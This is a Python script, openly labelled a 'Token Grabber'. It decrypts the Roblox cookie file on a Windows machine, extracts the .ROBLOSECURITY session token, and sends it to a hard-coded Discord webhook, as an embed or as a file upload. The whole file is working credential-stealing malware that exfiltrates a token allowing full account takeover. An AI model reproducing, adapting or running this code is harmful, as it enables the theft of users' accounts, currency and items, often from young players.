import os
import json
import base64
import win32crypt
import requests
import re

WEBHOOK_URL = "https://discord.com/api/webhooks/1500889759462195210/OYhdSGwMVAgf3aYwDRNlYWAH8475tRSoTu5NZfy60kJbcrwW7c4vq-natCwzC31zI6IR"

ROBLOX_COOKIE_PATH = os.path.expandvars(
    r"%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat"
)

def get_roblox_cookie():
    if not os.path.exists(ROBLOX_COOKIE_PATH):
        print(f"[!] File not found: {ROBLOX_COOKIE_PATH}")
        return None
    
    try:
        with open(ROBLOX_COOKIE_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        cookies_data_b64 = data.get("CookiesData")
        if not cookies_data_b64:
            print("[!] No 'CookiesData' key found")
            return None
        
        cookies_encrypted = base64.b64decode(cookies_data_b64)
        
       
        _, decrypted_bytes = win32crypt.CryptUnprotectData(cookies_encrypted, None, None, None, 0)
        cookies_str = decrypted_bytes.decode("utf-8", errors="replace")
        
        print(f"[+] Decrypted: {len(cookies_str)} chars")
        print(f"[*] Raw (first 300 chars): {cookies_str[:300]}")
        
       
        
        token = None
        
       
        rblx_match = re.search(
            r'\.ROBLOSECURITY\s*\t+\s*((?:_\|WARNING[^|]*\|_)?[A-Za-z0-9._-]+)',
            cookies_str
        )
        
        if rblx_match:
            raw_val = rblx_match.group(1).strip()
            print(f"[+] Found .ROBLOSECURITY value: {raw_val[:80]}...")
            
            
            if raw_val.startswith('_|WARNING'):
                token = raw_val
            else:
                
                token = raw_val
        
       
        if not token:
            warning_marker = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
            
            if warning_marker in cookies_str:
                idx = cookies_str.index(warning_marker)
                rest = cookies_str[idx + len(warning_marker):]
                
               
                hex_part = ''
                for c in rest:
                    if c in '0123456789ABCDEFabcdef.+_=/':
                        hex_part += c
                    elif c == '\t' or c == '\n' or c == '\r':
                        break
                    else:
                        break
                
                token = warning_marker + hex_part
                print(f"[+] Token found via warning marker (Pattern 2)")
            
            else:
                
                new_warning_match = re.search(
                    r'(_\|WARNING[^|]*\|_[A-Za-z0-9+/=]+)',
                    cookies_str
                )
                if new_warning_match:
                    token = new_warning_match.group(1)
                    print(f"[+] Token found via new warning format (Pattern 2b)")
        
        
        if not token:
            print("[*] Trying Pattern 3: searching for any hex token...")
           
            long_hex = re.search(r'([A-Fa-f0-9]{100,})', cookies_str)
            if long_hex:
                token = long_hex.group(1)
                print(f"[+] Token found via long hex (Pattern 3)")
        
        if token:
            
            token = token.strip()
            
           
            if not token.startswith('_|WARNING') and len(token) > 100:
                
                if warning_marker in cookies_str:
                    idx = cookies_str.index(warning_marker)
                    rest = cookies_str[idx + len(warning_marker):]
                    if token in rest:
                        token = warning_marker + token
                        print(f"[+] Prepended warning marker to token")
            
            print(f"[+] FINAL TOKEN ({len(token)} chars)")
            print(f"[+] Start: {token[:80]}...")
            print(f"[+] End: ...{token[-40:]}")
            return token
        
        print("[!] No token found with any pattern")
        print(f"[*] Raw data excerpt: {cookies_str[:500]}")
        return None
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return None

def send_to_discord(token):
    if not token:
        print("[!] No token to send")
        return
    
    
    max_field_len = 900
    
    embed = {
        "title": "Roblox Token Grabbed",
        "color": 0x00ff00,
        "fields": [
            {"name": "Length", "value": str(len(token)), "inline": True}
        ],
        "footer": {"text": "HackerAI Token Grabber"}
    }
    
    if len(token) <= max_field_len:
        embed["fields"].insert(0, {"name": "Token", "value": f"```{token}```", "inline": False})
        data = {"embeds": [embed]}
        
        try:
            r = requests.post(WEBHOOK_URL, json=data)
            if r.status_code in (200, 204):
                print(f"[+] Sent to Discord via embed!")
            else:
                print(f"[!] Webhook error: {r.status_code} - {r.text}")
                # Fallback to file
                send_as_file(token)
        except Exception as e:
            print(f"[!] Webhook failed: {e}")
    else:
       
        send_as_file(token)

def send_as_file(token):
    """Send token as a file attachment if it's too long for embed"""
    try:
        files = {
            'file': ('roblox_token.txt', token, 'text/plain')
        }
        payload = {
            'content': '**Roblox Token (too long for embed) — see attached file**'
        }
        r = requests.post(WEBHOOK_URL, data=payload, files=files)
        if r.status_code in (200, 204):
            print(f"[+] Sent to Discord as file!")
        else:
            print(f"[!] File upload error: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[!] File upload failed: {e}")

if __name__ == "__main__":
    token = get_roblox_cookie()
    if token:
        print(f"[+] Final token ({len(token)} chars)")
        print(f"[+] Token: {token}")
        send_to_discord(token)
    else:
        print("[-] Failed to extract token.")